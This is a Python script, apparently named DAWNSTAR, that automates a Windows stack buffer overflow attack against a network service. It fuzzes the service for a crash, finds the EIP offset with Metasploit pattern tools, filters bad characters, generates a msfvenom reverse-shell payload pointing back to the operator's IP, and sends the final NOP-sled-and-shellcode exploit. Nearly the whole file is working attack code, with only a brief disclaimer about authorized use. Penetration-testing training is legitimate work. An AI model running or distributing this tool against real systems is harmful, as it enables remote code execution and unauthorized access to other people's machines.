import socket, time, binascii, subprocess, re, os, struct

ascii_art = """
 ______   _______           _        _______ _________ _______  _______ 
(  __  \ (  ___  )|\     /|( (    /|(  ____ \\__   __/(  ___  )(  ____ )
| (  \  )| (   ) || )   ( ||  \  ( || (    \/   ) (   | (   ) || (    )|
| |   ) || (___) || | _ | ||   \ | || (_____    | |   | (___) || (____)|
| |   | ||  ___  || |( )| || (\ \) |(_____  )   | |   |  ___  ||     __)
| |   ) || (   ) || || || || | \   |      ) |   | |   | (   ) || (\ (   
| (__/  )| )   ( || () () || )  \  |/\____) |   | |   | )   ( || ) \ \__
(______/ |/     \|(_______)|/    )_)\_______)   )_(   |/     \||/   \__/
"""

def send_data(ip, port, data):
  try:
      with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
          s.connect((ip, port))
          s.send(data)
          s.close()
  except socket.error as e:
      print(f"Error sending data: {e}")

#################################################################
################# - -- ---> FUZZING <--- -- - ###################
#################################################################

def fuzzing(ip, port, timeout=5):
  buffer_size = 100
  methods = [method1, method2, method3, method4, method5]
  crash_detected = False

  # Phase 1: Broad Scan
  while buffer_size <= 3000:
      for method in methods:
          try:
              print(f"Trying payload size: {buffer_size} with method: {method.__name__}")
              method(ip, port, 'A' * buffer_size)
          except socket.error as e:
              print(f"Error with method {method.__name__} at size {buffer_size}: {e}")

      response = input("Did the application crash? (yes/no): ").lower()
      if response == "yes":
          crash_detected = True
          break

      buffer_size += 100  # Increment buffer size

  if not crash_detected:
      print("Fuzzing completed without detecting a crash.")
      return None, None

  # User restarts the application
  print("Please restart the application.")
  input("Press Enter after restarting the application.")

  # Phase 2: Precise Scan
  precise_start = max(100, buffer_size - 100)  # Start 100 bytes before the crash point
  for precise_size in range(precise_start, buffer_size + 100, 100):
      for method in methods:
          try:
              print(f"Trying payload size: {precise_size} with method: {method.__name__}")
              method(ip, port, 'A' * precise_size)
              response = input("Did the application crash? (yes/no): ").lower()
              if response == "yes":
                  print(f"Application crashed at {precise_size} bytes using {method.__name__}")
                  return precise_size, method
          except socket.error as e:
              print(f"Error with method {method.__name__} at size {precise_size}: {e}")

  print("Precise scanning completed without detecting a specific crash point.")
  return None, None       

#################################################################
############ - -- ---> DATA SEND METHODS <--- -- - ##############
#################################################################

def method1(ip, port, data):
# Ensure that 'data' is bytes before concatenation
  if isinstance(data, str):
    data = data.encode()  # Convert string to bytes
  send_data(ip, port, data + b"\n")

def method2(ip, port, data):
  # Ensure that 'data' is bytes
  if isinstance(data, str):
      data = data.encode()
  send_data(ip, port, data)

def method3(ip, port, data):
  # Ensure that 'data' is bytes
  if isinstance(data, str):
      data = data.encode()
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.connect((ip, port))
      s.sendall(data + b"\n")  # Sending all data at once followed by newline

def method4(ip, port, data):
  # Ensure that 'data' is bytes
  if isinstance(data, str):
      data = data.encode()
  send_data(ip, port, data)
  time.sleep(1)

def method5(ip, port, data):
  # Ensure that 'data' is bytes
  if isinstance(data, str):
      data = data.encode()
  send_data(ip, port, data)
  time.sleep(2)
#################################################################
############### - -- ---> SEND CYCLIC <--- -- - #################
#################################################################

def send_cyclic(ip, port, effective_method, prefix, suffix, offset):
  msf = "/usr/share/metasploit-framework"
  print("\n[+] Creating cyclic pattern with offset")
  command = f"{msf}/tools/exploit/pattern_create.rb -l {offset} > pattern.buf"
  execute(command)

  with open("pattern.buf", "r") as file:
      buffer = file.read()

  print("[!] Restart the app")
  input("[~] Press enter to send cyclic pattern")

  # Ensure prefix, buffer, and suffix are all bytes
  if isinstance(prefix, str):
      prefix = prefix.encode()
  if isinstance(suffix, str):
      suffix = suffix.encode()
  buffer = buffer.encode()  # Convert buffer to bytes

  try:
      effective_method(ip, port, prefix + buffer + suffix)
  except socket.timeout:
      print("[~] Crashed the app, check the EIP")

  eip = input("[?] Enter EIP value: ")
  command = f"{msf}/tools/exploit/pattern_offset.rb -q {eip.strip()}" + " | awk '{print $6}' > /tmp/offset"
  execute(command)

  with open("/tmp/offset", "r") as fp:
      content = fp.read().strip()
      if content == "":
          print("[-] Unable to get a match")
          return None
      else:
          print(f"[+] Offset found at address {content}")
          return int(content)

#################################################################
############### - -- ---> CONTROL EIP <--- -- - #################
#################################################################

def control_eip(ip, port, eip_offset, effective_method):
  buffer = "A" * eip_offset + "B" * 4  # 'B's will overwrite EIP
  try:
      # Use the effective method to send the buffer
      effective_method(ip, port, buffer.encode())
      print("Buffer sent to control EIP. Check if EIP is overwritten with 'B's (42424242).")
  except Exception as e:
      print(f"Error: {e}")

#################################################################
########### - -- ---> GENERATE BAD CHARS <--- -- - ##############
#################################################################

def generate_chars(badchars: [str]) -> bytes:
    """
    generate all chars after filtering out badchars
    :param badchars: ["\\x0a", "\\x0d"]
    :return: "0102.."
    """
    char_str = ""

    for x in range(1, 256):
        current_char = "\\x" + '{:02x}'.format(x)

        if current_char not in badchars:
            char_str += current_char[2:]
            # remove the leading "\x"
    return binascii.unhexlify(char_str)

#################################################################
############## - -- ---> BAD CHARS ESP <--- -- - ################
#################################################################

def badchars_esp(ip, port, offset, effective_method):
  print("\n[!] Restart the app")
  input("[+] Press enter to send bad chars")

  current_badchars = ["\\x00"]

  while True:
      allchars = generate_chars(current_badchars)

      padding = "A" * offset
      eip = "B" * 4
      esp = "C" * 8
      buffer = padding.encode() + eip.encode() + allchars

      try:
          print("[?] Sending buffer")
          effective_method(ip, port, buffer)
      except socket.error as e:
          print(f"Error sending data: {e}")

      print("[+] Current_badchars: ", current_badchars)
      print("[!] Pro tip: !mona compare -f c:\\path\\bytearray.bin -a esp")
      print("[!] Restart the app")
      print("[+] Current_badchars: ", current_badchars)
      command = input("[+] Enter badchar (\\x00 \\x01 ..) to filter out (type 'done' to proceed): ").strip()
      if command.lower() == "done":
          break
      elif " " in command:
          current_badchars.extend(command.split(" "))
      elif command != "":
          current_badchars.append(command)

  print("[+] Badchars detected: ", "".join(current_badchars))
  return "".join(current_badchars)

#################################################################
############# - -- ---> BAD CHARS NO ESP <--- -- - ##############
#################################################################

def badchars_not_esp(ip, port, offset, effective_method):
  current_badchars = ["\\x00"]

  while True:
      allchars = generate_chars(current_badchars)

      number = input("[+] Enter amount to send (enter to send all, exit to end): ").strip()
      if number.lower() == "exit":
          break
      elif number == "":
          number = len(allchars)

      bindex = int(number)
      if bindex > len(allchars):
          bindex = len(allchars)

      padding = "A" * offset
      eip = "B" * 4
      esp = "C" * 8

      buffer = allchars[:bindex] + padding[len(allchars[:bindex]):].encode() + eip.encode() + esp.encode()

      try:
          print("[?] Sending buffer")
          effective_method(ip, port, buffer)
      except socket.error as e:
          print(f"Error sending data: {e}")

      print("[+] Current_badchars: ", current_badchars)
      command = input("[+] Enter badchar (\\x00 \\x01 ..) to filter out (type 'done' to proceed): ").strip()
      if command.lower() == "done":
          break
      elif " " in command:
          current_badchars.extend(command.split(" "))
      elif command != "":
          current_badchars.append(command)

  print("[+] Badchars detected: ", "".join(current_badchars))
  return "".join(current_badchars)

#################################################################
############# - -- ---> GET USER INPUT <--- -- - ################
#################################################################

def get_user_input():
    # Advanced Configuration
    advanced_config = input("[?] Do you want to use advanced configuration? (yes/no): ").lower()

    # IP Address
    ip_address = input("Enter the target IP address: ")

    # Port Number
    port = input("Enter the target port (default is 445 for SMB): ")
    if not port:
        port = 445  # Default SMB port
    else:
        port = int(port)

    return advanced_config, ip_address, port

#################################################################
################ - -- ---> EXECUTION <--- -- - ##################
#################################################################

def execute(command):
  """Executes a system command."""
  subprocess.call(command, shell=True)

#################################################################
############# - -- ---> SHELL GENERATION <--- -- - ##############
#################################################################

def shell_gen(interface, rport, badchars):
  """Generates shellcode with msfvenom."""
  try:
      ip_command = f"ip addr show {interface} | grep 'inet ' | awk '{{print $2}}' | cut -d'/' -f1"
      ip = subprocess.check_output(ip_command, shell=True).decode().strip()
      print(f"[+] IP Detected: {ip}")

      # Ensure /tmp directory exists
      if not os.path.exists("/tmp"):
          os.makedirs("/tmp")

      shellcode_command = f"msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={rport} " \
                          f"EXITFUNC=thread -b '{badchars}' -f raw > /tmp/shellcode 2>/dev/null"
      subprocess.run(shellcode_command, shell=True, check=True)
      print("[+] Shellcode generated and saved to /tmp/shellcode")

  except subprocess.CalledProcessError as e:
      print(f"[!] Failed to generate shellcode: {e}")
  except Exception as e:
      print(f"[!] Error: {e}")

# Integration in the main function (after badchars identification)
# shell_gen("eth0", 4444, badchars_result)

#################################################################
################# - -- ---> EXPLOIT <--- -- - ###################
#################################################################

def exploit(target_ip, target_port, offset, badchars):
  """
  Creates and sends the final exploit payload.
  :param target_ip: IP address of the target machine
  :param target_port: Port number of the target machine
  :param offset: The EIP offset found during fuzzing
  :param badchars: String of bad characters to avoid in shellcode
  """

  # Prompt to restart the application and use Mona
  print(f"[!] Pro tip: Use the Mona command to find a suitable JMP address: !mona jmp -r esp -cpb '{badchars}'")
  input("[!] Please restart the application you are targeting and press Enter after doing so... ")
  jmp_address = input("[+] Enter the JMP instruction address to redirect execution (without 0x, found using Mona): ").strip()
  eip = struct.pack("<I", int(jmp_address, 16))

  # NOP sled
  nops = b"\x90" * 32

  # Load the shellcode from file
  with open("/tmp/shellcode", "rb") as f:
      shellcode = f.read()
  print(f"[+] Loaded shellcode of size: {len(shellcode)} bytes")

  # Construct the buffer
  buffer = ("A" * offset).encode() + eip + nops + shellcode

  print("[+] Exploiting target {} on port {}".format(target_ip, target_port))

  # Send the payload
  try:
      with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
          s.connect((target_ip, int(target_port)))
          s.send(buffer + b"\n")  # Sending payload with a newline
          print("[+] Payload sent successfully!")
  except Exception as e:
      print(f"[-] Error sending payload: {e}")

# Example usage
# exploit("192.168.1.100", 9999, eip_offset, "\\x00\\x0a")


#################################################################
################ - -- ---> CHECK ESP <--- -- - ##################
#################################################################

def check_esp(ip, port, prefix, suffix, offset):
  """Checks if ESP has enough room for the shellcode."""
  input("[=] Restart the app and press Enter to send a large buffer... ")
  buffer = prefix.encode() + ("A" * offset).encode() + ("B" * 4).encode() + ("C" * 500).encode() + suffix.encode()

  print("[?] Sending buffer to check ESP space")
  send_data(ip, port, buffer)
  print("[+] Buffer sent, check the ESP register content")

# Example usage in your main function:
# shell_gen("tun0", 4444, "\\x00")
# exploit("192.168.1.100", 9999, "", "", 2000, "\\x00")
# check_esp("192.168.1.100", 9999, "", "", 2000)

#################################################################
################## - -- ---> MAIN <--- -- - ####################
#################################################################

def main():
  print(ascii_art)  # ASCII Art

  # Reminder for setting up Mona in Immunity Debugger
  print("[!] Before running this script, ensure you've set up Mona in Immunity Debugger.")
  print("    Use the command: '!mona bytearray -f \"\\x00\"' to generate the initial bytearray.")
  print("    This helps in the bad character analysis process.")
  print("    Replace '\\x00' with any known bad characters.\n")

  # User Inputs
  advanced_config, ip_address, port = get_user_input()

  # Fuzzing to identify the effective method and crash size
  crash_size, effective_method = fuzzing(ip_address, port)
  if crash_size and effective_method:
      print(f"\nApplication crashed at buffer size: {crash_size} using {effective_method.__name__}")

      # Sending a cyclic pattern using the effective method
      prefix = ''  # Modify as needed
      suffix = ''  # Modify as needed
      eip_offset = send_cyclic(ip_address, port, effective_method, prefix, suffix, crash_size)

      if eip_offset is not None:
          print(f"\nEIP offset found at address {eip_offset}")
          print("Taking Offset value...")

          # Pause for user to restart the debugger
          input("\nPlease restart the debugger and press Enter to continue...")

          print("\nTrying to control EIP...")
          control_eip(ip_address, port, eip_offset, effective_method)
          print("Check if EIP is overwritten with 'B's (42424242).")

          confirmation = input("\nIs the EIP correctly overwritten? (yes/no): ").lower()
          if confirmation == "yes":
              print("\nEIP control confirmed. Proceeding to the next step...")

              # Determine where to check for badchars
              bad_char_location = input("\nAre the bad characters expected in the ESP register? (yes/no): ").lower()
              if bad_char_location == "yes":
                  badchars_result = badchars_esp(ip_address, port, eip_offset, effective_method)
              else:
                  badchars_result = badchars_not_esp(ip_address, port, eip_offset, effective_method)

              print(f"\nIdentified bad characters: {badchars_result}")
              print("\nProceeding to shellcode generation...")

              # Get network interface and port for reverse shell
              interface = input("[+] Enter the network interface for reverse shell (e.g., eth0): ")
              rport = input("[+] Enter the listening port for reverse shell: ")

              # Generate shellcode
              shell_gen(interface, rport, badchars_result)

              # Confirmation to proceed with the exploit
              print("\n[!] Disclaimer: This tool is intended for educational and authorized testing purposes only.")
              proceed = input("[?] Do you wish to proceed with the exploit against a target? Type 'yes' to continue: ").lower()
              if proceed == 'yes':
                  print("\n[!] Legal Disclaimer: Use this tool legally and responsibly.")
                  consent = input("[?] Do you agree to use this tool legally and responsibly (yes/no)? ").lower()
                  if consent != 'yes':
                      print("[!] Exploitation cancelled.")
                      return

                  # Get target information for the exploit
                  target_ip = input("[+] Enter the target IP address: ")
                  target_port = input("[+] Enter the target port: ")

                  # Execute the exploit
                  exploit(target_ip, target_port, eip_offset, badchars_result)
              else:
                  print("\n[!] Exploitation process aborted.")

          else:
              print("\nEIP control failed. Please review the process.")

      else:
          print("\nUnable to find EIP offset. Please review the process.")
  else:
      print("\nNo crash detected or effective method found. Please review your approach.")

if __name__ == "__main__":
  main()
